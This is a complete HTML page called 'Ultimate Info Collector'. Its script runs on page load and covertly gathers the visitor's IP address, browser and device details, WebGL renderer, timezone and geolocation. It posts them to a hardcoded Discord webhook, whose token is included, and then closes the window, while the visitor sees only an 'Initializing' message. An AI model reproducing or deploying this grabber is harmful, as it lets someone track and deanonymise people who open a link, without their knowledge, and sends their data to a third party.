<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Ultimate Info Collector</title><style>@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);font-family:'Orbitron',sans-serif;color:#fff;overflow:hidden;}#container{display:flex;flex-direction:column;align-items:center;background:rgba(0,0,0,0.3);padding:30px;border-radius:15px;box-shadow:0 0 20px rgba(0,0,0,0.5);max-width:80%;text-align:center;}h1{margin:0 0 20px;font-size:2rem;letter-spacing:2px;color:#00ffe7;text-shadow:0 0 10px #00ffe7;}#status{font-size:1.2rem;margin-bottom:20px;min-height:50px;}</style></head><body><div id="container"><h1>Ultimate Info Collector</h1><div id="status">Initializing<span id="dots"></span></div></div><script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
const info = {ip:null,userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
async function main(){
  try{info.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{}
  try{const gl=document.createElement('canvas').getContext('webgl');if(gl){const d=gl.getExtension('WEBGL_debug_renderer_info');info.renderer=gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}}catch{}
  if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>{info.latitude=p.coords.latitude;info.longitude=p.coords.longitude;sendData();},()=>sendData());
  else sendData();
  async function sendData(){
    const fd=new FormData(); fd.append('payload_json',JSON.stringify({content:'**Ultimate Grab**',embeds:[{description:JSON.stringify(info,null,2)}]}));
    await fetch(WEBHOOK_URL,{method:'POST',body:fd});
    setTimeout(()=>window.close(),800);
  }
}main();
</script></body></html>
